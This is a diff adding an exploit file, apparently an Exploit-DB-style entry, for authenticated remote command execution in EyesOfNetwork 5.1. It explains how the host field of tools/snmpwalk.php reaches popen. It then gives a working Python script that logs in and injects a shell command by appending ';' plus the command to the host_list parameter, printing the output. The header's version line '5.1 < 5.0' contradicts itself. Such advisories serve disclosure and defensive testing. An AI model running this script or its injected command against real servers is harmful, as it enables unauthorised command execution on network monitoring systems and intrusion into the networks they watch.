@@ -1,0 +1,77 @@
+# Exploit Title: EyesOfNetwork 5.1 - Authenticated Remote Command Execution
+# Google Dork: N/A
+# Date: 2019-08-14
+# Exploit Author: Nassim Asrir
+# Vendor Homepage: https://www.eyesofnetwork.com/
+# Software Link: https://www.eyesofnetwork.com/?page_id=48&lang=fr
+# Version: 5.1 < 5.0
+# Tested on: Windows 10 
+# CVE : N/A
+
+#About The Product:
+
+''' EyesOfNetwork ("EON") is the OpenSource solution combining a pragmatic usage of ITIL processes and a technological interface allowing their workaday application. 
+EyesOfNetwork Supervision is the first brick of a range of products targeting to assist IT managment and gouvernance. 
+EyesOfNetwork Supervision provides event management, availability, problems and capacity. 
+#Technical Analysis:
+EyesOfNetwork allows Remote Command Execution via shell metacharacters in the module/tool_all/ host field.
+By looking into tools/snmpwalk.php we will find the vulnerable part of code:
+else{
+	$command = "snmpwalk -c $snmp_community -v $snmp_version $host_name";
+}
+in this line we can see as the attacker who control the value of "$host_name" variable .
+And after that we have the magic function "popen" in the next part of code.
+			$handle = popen($command,'r');
+echo 		"<p>";<br />
+			while($read = fread($handle,100)){ 
+				echo nl2br($read); 
+				flush();
+			} 
+			pclose($handle);			
+And now we can see the use of "popen" function that execute the $command's value and if we set a shell metacharacters ";" in the end of the command we will be able to execute OS command.'''
+
+#Exploit
+
+import requests
+import optparse
+import sys
+import bs4 as bs
+
+commandList = optparse.OptionParser('usage: %prog -t https://target:443 -u admin -p pwd -c "ls"')
+commandList.add_option('-t', '--target', action="store",
+                  help="Insert TARGET URL",
+                  )
+commandList.add_option('-c', '--cmd', action="store",
+                  help="Insert command name",
+                  )
+commandList.add_option('-u', '--user', action="store",
+                  help="Insert username",
+                  )
+commandList.add_option('-p', '--pwd', action="store",
+                  help="Insert password",
+                  )
+options, remainder = commandList.parse_args()
+ 
+if not options.target or not options.cmd or not options.user or not options.pwd:
+
+    commandList.print_help()
+    sys.exit(1)
+ 
+ 
+url = options.target
+cmd = options.cmd
+user = options.user
+pwd = options.pwd
+ 
+with requests.session() as c:
+    link=url
+    initial=c.get(link) 
+    login_data={"login":user,"mdp":pwd} 
+    page_login=c.post(str(link)+"/login.php", data=login_data) 
+v_url=link+"/module/tool_all/select_tool.php"
+v_data = {"page": "bylistbox", "host_list": "127.0.0.1;"+cmd, "tool_list": "tools/snmpwalk.php", "snmp_com": "mm", "snmp_version": "2c", "min_port": "1", "max_port": "1024", "username": '', "password": '', "snmp_auth_protocol": "MD5", "snmp_priv_passphrase": '', "snmp_priv_protocol": '', "snmp_context": ''}
+page_v=c.post(v_url, data=v_data)
+my=bs.BeautifulSoup(page_v.content, "lxml")
+for textarea in my.find_all('p'):
+            final = textarea.get_text()
+print final
